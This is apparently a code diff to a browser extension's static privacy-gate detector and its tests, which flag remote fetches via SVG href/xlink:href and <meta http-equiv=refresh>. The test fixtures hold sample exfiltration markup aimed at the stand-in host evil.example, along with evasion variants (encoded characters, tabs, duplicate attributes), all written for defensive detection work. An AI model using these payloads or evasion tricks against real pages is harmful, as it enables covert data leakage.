@@ -266,11 +266,33 @@ function findScriptViolations(rawHtml: string, label: string): string[] {
 // <body>/<table>/<tr>/<td> attribute Chrome still maps to background-image and still fetches.
 const URL_ATTRS = new Set(['src', 'srcset', 'poster', 'data', 'action', 'formaction', 'background']);
 
-// `href` is checked on these tags ONLY. On <link> it is an auto-fetched subresource; on <base>
-// it retargets every relative URL on the page, which would turn the local-path allowance below
-// into a remote fetch. On <a>/<area> it is user-initiated NAVIGATION, not a fetch — checking it
-// would redden this gate the day the options page gains a legitimate outbound link.
-const HREF_TAGS = new Set(['link', 'base']);
+// `href` is checked on every tag EXCEPT these. Inverted from the old `['link', 'base']` allowlist
+// deliberately: the set of tags that fetch from `href` is not one anybody can enumerate correctly
+// and keep correct. Past <link> (an auto-fetched subresource) and <base> (which retargets every
+// relative URL on the page) sit the SVG elements, where <image> and <feImage> fetch exactly like
+// an <img> while a dozen more resolve references a browser may or may not follow off-document.
+// Drawing that boundary wrong in the allowlist direction is a silent hole; defaulting to "checked"
+// makes every such misjudgement an over-report instead. What must stay exempt is user-initiated
+// NAVIGATION — <a>/<area>, in HTML and SVG alike — or this gate reddens the day the options page
+// gains a legitimate outbound link. Those two are also the complete set of HTML elements that
+// carry a live `href` besides <link>/<base>, so nothing else regresses.
+const HREF_EXEMPT_TAGS = new Set(['a', 'area']);
+
+// SVG fetches from the SVG 1.1 spelling `xlink:href` as well as the plain `href`, and the HTML
+// parser keeps the prefix in the attribute name (measured: happy-dom yields `xlink:href` for
+// `<svg><image xlink:href="…"/></svg>`). A scan matching `href` alone never sees it.
+//
+// Matched by suffix rather than against a two-entry set, for the same reason HREF_EXEMPT_TAGS is an
+// exclusion list. Only the fixed `xlink:` prefix actually reaches a fetch — an HTML document has no
+// namespace bindings, so `<svg xmlns:xl="…/xlink"><image xl:href="…"/></svg>` lands as a
+// null-namespace attribute named literally `xl:href` that SVG never resolves (measured: happy-dom
+// reports localName `xl:href`, namespace null, and `getAttributeNS(xlink, 'href')` null, against
+// namespace `xlink`/localName `href` for the real spelling). Matching every `*:href` anyway costs
+// an over-report on markup that fetches nothing, and buys not having to re-derive the parser's
+// foreign-attribute adjustment table on the next read of this file.
+function isHrefAttr(attr: string): boolean {
+  return attr === 'href' || attr.endsWith(':href');
+}
 
 // Split a `srcset` into its candidate URLs (the token before each descriptor). Commas inside a
 // URL would split wrongly, but every such URL carries a scheme (`data:`) and is rejected anyway,
@@ -284,6 +306,50 @@ function splitSrcset(rawValue: string): string[] {
     .split(',')
     .map((candidate) => candidate.trim().split(/\s+/)[0])
     .filter((candidate) => candidate !== ''); // an empty candidate fetches nothing
+}
+
+// `<meta http-equiv="refresh" content="0;url=…">` performs an automatic top-level navigation to
+// whatever the URL interpolates — no user action, no click. It is the one vector in this file with
+// NO runtime control behind it: the extension-pages CSP restricts subresources and code, and Chrome
+// dropped the `navigate-to` directive, so there is no directive that would stop it. For this vector
+// the static gate is not the backup, it is the whole control.
+//
+// Returns every URL such a refresh could navigate to, skipping the ones that carry none —
+// `content="0"` and an empty `url=` reload the current document, which is same-origin and leaks
+// nothing. Parses each `content` per the HTML spec's shared declarative refresh steps loosely and
+// always in the over-reporting direction: the time is treated as optional (a real parser requires
+// it), `url=` genuinely IS optional (`content="0;https://…"` navigates — measured), and either `;`
+// or `,` separates them. Quotes around the URL are left on for normalizeUrlValue to strip, as is
+// the character-reference decoding the HTML parser already did.
+//
+// Takes the UNION over duplicate attributes — any `http-equiv` that reads `refresh` arms it, and
+// every `content` is classified — rather than picking one occurrence. A duplicate attribute is a
+// tokenizer parse error that browsers resolve by keeping the FIRST and dropping the rest (measured:
+// happy-dom yields `http-equiv="refresh"` for `<meta content="0;url=https://evil.example/"
+// http-equiv="refresh" http-equiv="not-refresh">`, i.e. a live navigation). A last-wins read of
+// that markup returned clean — a real hole, found in review. Mirroring first-wins would close it
+// but leave the gate coupled to a tokenizer rule it cannot see; the union closes it whichever
+// occurrence a parser keeps. No duplicate attribute exists anywhere in `src/`, so the only cost is
+// an over-report on markup that is already malformed.
+function readMetaRefreshTargets(
+  attrList: ReadonlyArray<{ name: string; value: string | undefined }>,
+): string[] {
+  let isRefresh = false;
+  const contents: string[] = [];
+  for (const { name, value } of attrList) {
+    if (value === undefined) continue;
+    const attr = name.toLowerCase();
+    // Trimmed before comparing, which a real parser does NOT do — `http-equiv=" refresh "` is inert
+    // in Chrome (the spec matches the attribute value exactly, ASCII case-insensitively). Treating
+    // it as live over-reports, the safe direction.
+    if (attr === 'http-equiv') {
+      if (stripQuotes(value).trim().toLowerCase() === 'refresh') isRefresh = true;
+    } else if (attr === 'content') contents.push(stripQuotes(value));
+  }
+  if (!isRefresh) return [];
+  return contents
+    .map((content) => /^\s*[\d.]*\s*[;,]?\s*(?:url\s*=\s*)?([\s\S]*)$/i.exec(content)?.[1].trim() ?? '')
+    .filter((target) => target !== '');
 }
 
 // Report every URL-bearing attribute and CSS `url()` whose target is not a relative in-tree path.
@@ -310,12 +376,23 @@ function findSubresourceViolations(rawHtml: string, label: string): string[] {
     // (`<div data-html="<img src='https://…'>">`) re-matches as a real tag — a false positive; a
     // real parser yields no such element (measured).
     if (attrs !== null) tagRe.lastIndex += attrs.length + 1;
-    for (const { name, value } of readAttributes(attrs ?? rawHtml.slice(tagRe.lastIndex))) {
+    const attrList = readAttributes(attrs ?? rawHtml.slice(tagRe.lastIndex));
+    // Handled per-TAG rather than per-attribute: the navigation is only live when `http-equiv` and
+    // `content` are read together, and `content` is inert on every other `<meta>`.
+    if (tag === 'meta') {
+      for (const target of readMetaRefreshTargets(attrList)) {
+        if (isLocalInTreeSrc(target)) continue;
+        violations.push(
+          `${label}:${lineOf(m.index)} — remote or out-of-tree <meta http-equiv=refresh>: ${stripQuotes(target)}`,
+        );
+      }
+    }
+    for (const { name, value } of attrList) {
       const attr = name.toLowerCase();
       // Skipped here is the VALUELESS attribute (`<img src>`, no `=` at all), which fetches
       // nothing. An explicit `src=""` is a different case and IS flagged: it resolves to the page
       // itself rather than off-origin, so the report is an over-report — the safe direction.
-      const fetches = URL_ATTRS.has(attr) || (attr === 'href' && HREF_TAGS.has(tag));
+      const fetches = URL_ATTRS.has(attr) || (isHrefAttr(attr) && !HREF_EXEMPT_TAGS.has(tag));
       if (!fetches || value === undefined) continue;
       const targets = attr === 'srcset' ? splitSrcset(value) : [value];
       for (const target of targets) {
@@ -545,6 +622,20 @@ describe('privacy gate detector: inline <script> in HTML', () => {
     expect(findScriptViolations('<script src=./main.js defer></script>', 'h')).toEqual([]);
   });
 
+  it('flags an SVG <script href>, which loads its source from href rather than src', () => {
+    // The third fetching `href` in SVG, and the only one that pulls executable code. It needs no
+    // new rule: this half flags every <script> that lacks a relative in-tree `src=`, so an
+    // href-sourced one is already caught — as "inline", which understates it but fails closed.
+    // Pinned so a later reader does not "fix" the label by teaching readSrcValue about href and
+    // accidentally waving a remote SVG script through.
+    expect(
+      findScriptViolations('<svg><script href="https://evil.example/x.js"></script></svg>', 'h'),
+    ).toEqual(['h:1 — inline <script>']);
+    expect(
+      findScriptViolations('<svg><script xlink:href="https://evil.example/x.js"></script></svg>', 'h'),
+    ).toEqual(['h:1 — inline <script>']);
+  });
+
   it('reports every inline script in a file', () => {
     const html = '<script>a</script>\n<script src="b.js"></script>\n<script>c</script>';
     expect(findScriptViolations(html, 'h')).toEqual(['h:1 — inline <script>', 'h:3 — inline <script>']);
@@ -590,10 +681,10 @@ describe('privacy gate detector: remote subresources in HTML', () => {
     );
   });
 
-  it('checks href on <link> and <base> but not on <a>', () => {
+  it('checks href on <link> and <base> but not on <a>/<area>', () => {
     // <link> auto-fetches and <base> retargets every relative URL on the page — both are the
-    // gate's business. An <a> is user-initiated navigation, so an outbound link in the options
-    // page is legitimate and must not turn this red.
+    // gate's business. An <a>/<area> is user-initiated navigation, so an outbound link in the
+    // options page is legitimate and must not turn this red.
     expect(findSubresourceViolations('<link rel="stylesheet" href="./style.css">', 'h')).toEqual([]);
     expect(findSubresourceViolations('<link rel="stylesheet" href="https://cdn.example/x.css">', 'h')).toEqual(
       ['h:1 — remote or out-of-tree <link href>: https://cdn.example/x.css'],
@@ -602,6 +693,9 @@ describe('privacy gate detector: remote subresources in HTML', () => {
       'h:1 — remote or out-of-tree <base href>: https://evil.example/',
     ]);
     expect(findSubresourceViolations('<a href="https://chatgpt.com">docs</a>', 'h')).toEqual([]);
+    expect(
+      findSubresourceViolations('<area shape="rect" href="https://chatgpt.com">', 'h'),
+    ).toEqual([]);
   });
 
   it('flags a data: URI', () => {
@@ -734,6 +828,159 @@ describe('privacy gate detector: remote subresources in HTML', () => {
     expect(findSubresourceViolations('<img src="https://evil.example/eof.png"', 'h')).toEqual([
       'h:1 — remote or out-of-tree <img src>: https://evil.example/eof.png',
     ]);
+  });
+
+  it('flags an SVG <image> on either href spelling', () => {
+    // The residual PR #42 left open. `<svg><image>` is SVG's `<img>` — it fetches automatically on
+    // both the SVG 1.1 `xlink:href` and the SVG 2 plain `href`, but `href` used to be checked on
+    // `<link>`/`<base>` only, so neither form was read. Both parses measured against happy-dom:
+    // the element lands in the SVG namespace with the attribute intact, prefix and all.
+    expect(
+      findSubresourceViolations('<svg><image xlink:href="https://evil.example/x.png"/></svg>', 'h'),
+    ).toEqual(['h:1 — remote or out-of-tree <image xlink:href>: https://evil.example/x.png']);
+    expect(
+      findSubresourceViolations('<svg><image href="https://evil.example/x.png"/></svg>', 'h'),
+    ).toEqual(['h:1 — remote or out-of-tree <image href>: https://evil.example/x.png']);
+    expect(findSubresourceViolations('<svg><image xlink:href="./ok.png"/></svg>', 'h')).toEqual([]);
+  });
+
+  it('sees an SVG <image> target through case and normalization', () => {
+    // Same three evasions the `<img src>` case already pins, re-checked on the new attribute:
+    // attribute names are case-insensitive to the parser, the URL parser strips ASCII tab/LF/CR,
+    // and character references are decoded before either sees the value (all measured on the SVG
+    // form specifically — happy-dom returns the decoded `https://…` for the reference case).
+    expect(
+      findSubresourceViolations('<svg><IMAGE XLINK:HREF="https://evil.example/u.png"/></svg>', 'h'),
+    ).toEqual(['h:1 — remote or out-of-tree <image xlink:href>: https://evil.example/u.png']);
+    expect(
+      findSubresourceViolations('<svg><image href="ht\ttps://evil.example/tab.png"/></svg>', 'h'),
+    ).toEqual(['h:1 — remote or out-of-tree <image href>: ht\ttps://evil.example/tab.png']);
+    expect(
+      findSubresourceViolations('<svg><image href="&#x68;ttps://evil.example/hex.png"/></svg>', 'h'),
+    ).toEqual(['h:1 — remote or out-of-tree <image href>: &#x68;ttps://evil.example/hex.png']);
+  });
+
+  it('flags href on any other tag rather than enumerating which SVG elements fetch', () => {
+    // `<feImage>` fetches like an `<image>`; `<use>` is specified to resolve an external document;
+    // the reference-taking elements (`<pattern>`, `<textPath>`, `<mpath>`, the gradients, the
+    // animation elements) are the ones whose off-document behaviour varies by browser and version.
+    // That boundary is exactly what an allowlist would have to get right, so there is no allowlist:
+    // every tag but `<a>`/`<area>` is checked, and a tag that turns out not to fetch costs an
+    // over-report instead of a hole.
+    expect(
+      findSubresourceViolations('<svg><filter><feImage href="https://evil.example/f.png"/></filter></svg>', 'h'),
+    ).toEqual(['h:1 — remote or out-of-tree <feimage href>: https://evil.example/f.png']);
+    expect(
+      findSubresourceViolations('<svg><use href="https://evil.example/x.svg#a"/></svg>', 'h'),
+    ).toEqual(['h:1 — remote or out-of-tree <use href>: https://evil.example/x.svg#a']);
+    expect(
+      findSubresourceViolations('<svg><pattern xlink:href="https://evil.example/p.svg#x"/></svg>', 'h'),
+    ).toEqual(['h:1 — remote or out-of-tree <pattern xlink:href>: https://evil.example/p.svg#x']);
+    // Navigation stays exempt in the SVG namespace too, on both spellings.
+    expect(findSubresourceViolations('<svg><a href="https://chatgpt.com">t</a></svg>', 'h')).toEqual([]);
+    expect(
+      findSubresourceViolations('<svg><a xlink:href="https://chatgpt.com">t</a></svg>', 'h'),
+    ).toEqual([]);
+  });
+
+  it('flags a rebound href prefix even though it never reaches a fetch', () => {
+    // Raised in review as a possible evasion, then measured and found inert: an HTML document binds
+    // no namespaces, so `xmlns:xl` does nothing and `xl:href` lands as a null-namespace attribute
+    // named literally `xl:href` — happy-dom reports localName `xl:href` and
+    // `getAttributeNS(xlink, 'href') === null`, against namespace `xlink` / localName `href` for the
+    // real spelling. Only the parser's fixed adjustment table produces an XLink href. It is flagged
+    // anyway: matching every `*:href` is what keeps this from depending on that table staying as
+    // remembered, and the cost is this over-report on markup that fetches nothing.
+    expect(
+      findSubresourceViolations(
+        '<svg xmlns:xl="http://www.w3.org/1999/xlink"><image xl:href="https://evil.example/ns.png"/></svg>',
+        'h',
+      ),
+    ).toEqual(['h:1 — remote or out-of-tree <image xl:href>: https://evil.example/ns.png']);
+  });
+
+  it('flags a <meta http-equiv=refresh> that navigates off-origin', () => {
+    // The one vector with no runtime control behind it — the CSP restricts subresources and code,
+    // and Chrome dropped `navigate-to`. The query string carries whatever the page read, exactly
+    // like the `<img src>` payload, but nothing downstream would stop this one.
+    expect(
+      findSubresourceViolations(
+        '<meta http-equiv="refresh" content="0;url=https://evil.example/?d=leak">',
+        'h',
+      ),
+    ).toEqual([
+      'h:1 — remote or out-of-tree <meta http-equiv=refresh>: https://evil.example/?d=leak',
+    ]);
+  });
+
+  it('reads the refresh target through every content= form the parser accepts', () => {
+    // `url=` is optional, the separator may be `,`, the URL may be quoted inside the attribute, and
+    // both keywords are case-insensitive. Each form was run through happy-dom first: the
+    // character-reference case arrives at the refresh algorithm already decoded to `https://…`.
+    expect(
+      findSubresourceViolations('<meta http-equiv="refresh" content="0;https://evil.example/n">', 'h'),
+    ).toEqual(['h:1 — remote or out-of-tree <meta http-equiv=refresh>: https://evil.example/n']);
+    expect(
+      findSubresourceViolations('<meta http-equiv="REFRESH" content="0; URL=\'https://evil.example/q\'">', 'h'),
+    ).toEqual(['h:1 — remote or out-of-tree <meta http-equiv=refresh>: https://evil.example/q']);
+    expect(
+      findSubresourceViolations('<meta http-equiv="refresh" content="5,url=https://evil.example/c">', 'h'),
+    ).toEqual(['h:1 — remote or out-of-tree <meta http-equiv=refresh>: https://evil.example/c']);
+    expect(
+      findSubresourceViolations(
+        '<meta http-equiv="refresh" content="0;url=&#x68;ttps://evil.example/hex">',
+        'h',
+      ),
+    ).toEqual([
+      'h:1 — remote or out-of-tree <meta http-equiv=refresh>: &#x68;ttps://evil.example/hex',
+    ]);
+  });
+
+  it('is not fooled by a duplicate http-equiv or content attribute', () => {
+    // Both payloads navigate off-origin in a real parser — measured, not reasoned: happy-dom keeps
+    // the FIRST occurrence of a duplicate attribute and drops the rest, so the trailing
+    // `http-equiv="not-refresh"` and the trailing inert `content="0"` are discarded. A last-wins
+    // read of the attribute list returned `[]` for both, which is the shape of hole this whole file
+    // exists to prevent. Found in review; pinned so the union rule cannot quietly regress.
+    expect(
+      findSubresourceViolations(
+        '<meta content="0;url=https://evil.example/dup1" http-equiv="refresh" http-equiv="not-refresh">',
+        'h',
+      ),
+    ).toEqual(['h:1 — remote or out-of-tree <meta http-equiv=refresh>: https://evil.example/dup1']);
+    expect(
+      findSubresourceViolations(
+        '<meta http-equiv="refresh" content="0;url=https://evil.example/dup2" content="0">',
+        'h',
+      ),
+    ).toEqual(['h:1 — remote or out-of-tree <meta http-equiv=refresh>: https://evil.example/dup2']);
+    // The mirror case: a real parser keeps the leading `not-refresh` and never navigates, so this
+    // one is an over-report. Asserted rather than tolerated silently — taking the union is what
+    // keeps the gate from depending on a tokenizer rule it cannot observe, and the cost is this.
+    expect(
+      findSubresourceViolations(
+        '<meta http-equiv="not-refresh" http-equiv="refresh" content="0;url=https://evil.example/dup3">',
+        'h',
+      ),
+    ).toEqual(['h:1 — remote or out-of-tree <meta http-equiv=refresh>: https://evil.example/dup3']);
+  });
+
+  it('leaves a same-document refresh and a non-refresh <meta> alone', () => {
+    // `content="0"` reloads the current document — same origin, nothing to leak — and so does an
+    // empty `url=`. A `<meta>` that is not a refresh pragma carries an inert `content`, which must
+    // not be classified as a URL at all or every `<meta name="description">` reddens the gate.
+    expect(findSubresourceViolations('<meta http-equiv="refresh" content="0">', 'h')).toEqual([]);
+    expect(findSubresourceViolations('<meta http-equiv="refresh" content="0;url=">', 'h')).toEqual([]);
+    expect(
+      findSubresourceViolations('<meta http-equiv="refresh" content="0;url=./options.html">', 'h'),
+    ).toEqual([]);
+    expect(
+      findSubresourceViolations('<meta name="description" content="https://evil.example/">', 'h'),
+    ).toEqual([]);
+    expect(
+      findSubresourceViolations('<meta http-equiv="content-type" content="text/html">', 'h'),
+    ).toEqual([]);
+    expect(findSubresourceViolations('<meta charset="utf-8">', 'h')).toEqual([]);
   });
 
   it('reports every offending tag in a file, with its line', () => {
